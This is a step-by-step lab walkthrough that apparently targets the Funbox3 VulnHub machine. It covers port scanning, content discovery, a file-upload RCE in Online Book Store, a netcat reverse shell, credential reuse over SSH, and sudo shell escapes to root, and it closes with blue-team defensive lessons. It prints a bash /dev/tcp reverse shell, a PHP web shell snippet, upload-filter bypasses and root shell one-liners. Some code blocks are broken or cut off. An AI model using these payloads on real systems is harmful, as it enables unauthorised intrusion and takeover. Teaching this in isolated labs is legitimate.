## 0. What you will learn

- How to find a host and scan its ports.
- How to brute-force directories with `gobuster` and read `robots.txt`.
- How a **default credential** (`admin:admin`) and an **unauthenticated file
  upload** lead to code execution on a web server.
- How to catch a **reverse shell** with `netcat` and stabilise it.
- How to find **plaintext credentials** and pivot to a system user over SSH.
- How to abuse a **misconfigured `sudo` allow-list** (GTFOBins) to get `root`.

**Prerequisites:** Kali Linux with your target VM imported and both on the same
host-only network (attacker `192.168.56.10`, target `192.168.56.101`).

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
# What is my attacker IP and subnet?
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your lab NIC holds a `192.168.56.x/24` address, so the
> target must be somewhere in `192.168.56.0/24`.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.

> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# Full TCP sweep, then detailed service detection on the open ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:**
> - Port **22 (SSH)** — a login service; we need valid credentials for it.
> - Port **80 (HTTP)** — the main attack surface. A default Apache page means
>   the real content hides in a sub-directory.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.

```bash
# Look for hidden directories and files
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/wordlists/dirb/common.txt -t 40
```

```text
/store                (Status: 301) [--> /store/]
/admin                (Status: 301) [--> /admin/]
/secret               (Status: 301) [--> /secret/]
/robots.txt           (Status: 200)
```

```bash
curl -s http://192.168.56.101/robots.txt
```

```text
Disallow: /secret
```

> **Why it works:** `gobuster` sends thousands of HTTP requests for common
> filenames and reports any that return a non-`404` status. `robots.txt` is a
> file meant for search engines, but it silently advertises interesting paths —
> a classic information-leak on CTFs.

Browsing `/store/` shows the **Online Book Store** app.

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability

The `/store` app has an admin panel. Two weaknesses combine into Remote Code
Execution (RCE):

1. **Default credentials** `admin:admin` work at `http://192.168.56.101/store/admin.php`.
2. The *"Add new book"* form (`admin_add.php`) **accepts and stores `.php` files**
   with no authentication or type checking — a PHP web shell.

This is publicly documented as **Online Book Store 1.0 — Unauthenticated RCE**
(Exploit-DB **47887**, CVE-2020-19113).

> **Why it works:** a `.php` file uploaded into a web-served directory is
> *executed* by Apache when requested. `<?php echo shell_exec($_GET['cmd']); ?>`
> therefore runs whatever command we pass in `?cmd=`.

### 3.2 Exploit manually (two options)

**Option A — default creds + upload a reverse shell (most illustrative):**


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# Copy a ready-made PHP reverse shell and edit the IP/port
cp /usr/share/webshells/php/php-reverse-shell.php ./rev.php
# Edit these two lines inside rev.php:
#   $ip   = '192.168.56.10';   (your Kali IP)
#   $port = 4444;
```

Log in at `/store/admin.php` with `admin:admin`, click **Add new book**,
choose `rev.php` as the image, and save. The file lands in
`/store/bootstrap/img/`.

**Option B — the public exploit (no credentials needed):**


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>

### 3.3 Catch the reverse shell

```bash
# On Kali, start a listener on the port you set in rev.php
nc -lvnp 4444
```

Then trigger the payload from the uploaded location:

```bash
curl "http://192.168.56.101/store/bootstrap/img/rev.php"
```

```text

> **Why it works:** the uploaded PHP connects *outbound* to your listener, so
> you get a shell without needing a port open on the target's firewall.

Upgrade the dumb shell to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.

## 4. Privilege escalation — becoming root

### 4.1 Find credentials on disk

```bash
ls -la /home
cat /home/tony/password.txt
```

```text
ssh: yxcvbnmYYY
gym/admin: asdfghjklXXX
/store: admin@admin.com admin
```

> **Why it works:** developers often leave a "notes" file lying around. A
> plaintext password sitting in a user's home directory is one of the most
> common real-world findings (`varies by build`).

### 4.2 Pivot to the user `tony` over SSH

```bash
ssh tony@192.168.56.101
# password: yxcvbnmYYY
```

```text
tony@funbox3:~$ id

### 4.3 Abuse sudo


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```

```bash
sudo -l
```

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel

```

> **Why it works:** `NOPASSWD` means no password is required, and the list
> contains programs that can launch a shell or run arbitrary commands. This is
> the textbook "sudo allow-list" misconfiguration. **GTFOBins** documents a
> shell escape for each of these binaries.

# Any of these gives a root shell:
sudo pkexec /bin/sh
# or:

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Default credentials `admin:admin` | `/store/admin.php` | Admin access to the book store |
| 2 | Unauthenticated arbitrary file upload (CVE-2020-19113) | `/store/admin_add.php` | Remote Code Execution as `www-data` |
| 3 | Plaintext credentials in `password.txt` | `/home/tony/password.txt` | SSH access as user `tony` |
| 4 | Misconfigured `sudo` allow-list (`pkexec`, `time`, … NOPASSWD) | `sudoers` for `tony` | Privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Never ship default credentials.** Force a password change on first login;
  ban `admin/admin` via a startup check.
- **Validate uploads server-side.** Check the file extension and MIME type,
  store uploads *outside* the web root, and disable PHP execution in upload
  directories (`php_flag engine off`).
- **Delete `robots.txt` entries that point at sensitive paths** — it is a
  reconnaissance gift. Use authentication, not obscurity.
- **Never store passwords in plaintext.** Use a secret manager and restrict
  file permissions; scan home directories for `*password*` files.
- **Lock down `sudo`.** Grant the *specific* subcommand, not a general-purpose
  interpreter, and never combine `NOPASSWD` with shell-capable binaries.
- **Detection:** alert on HTTP `POST` to `admin_add.php` carrying `<?php`,
  outbound connections from the web server, and `pkexec`/`time` spawned under
  a web or low-privilege UID.
